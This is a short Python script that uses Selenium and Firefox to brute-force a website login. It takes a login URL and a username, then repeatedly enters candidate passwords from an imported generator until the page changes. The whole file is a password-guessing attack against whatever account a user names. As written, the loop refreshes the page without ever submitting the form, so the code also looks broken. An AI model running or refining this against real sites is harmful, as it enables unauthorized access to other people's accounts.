from algo import algo
from selenium.webdriver import Firefox

webAdd = input('Copy and paste the url of the login screen')
username = input("input username/email")
d = []
algorithm = algo()
with Firefox() as driver:
    # opens website
    driver.get(webAdd)
    i = 0
    login = driver.current_url
    while driver.current_url == login:
        # Finds username/email box, inputs username, and continues
        user_element = driver.find_element_by_name("username")
        user_element.clear()
        user_element.send_keys(username)
        password_element = driver.find_element_by_name("password")
        password_element.send_keys(algorithm[i])
        driver.refresh()
        i += 1
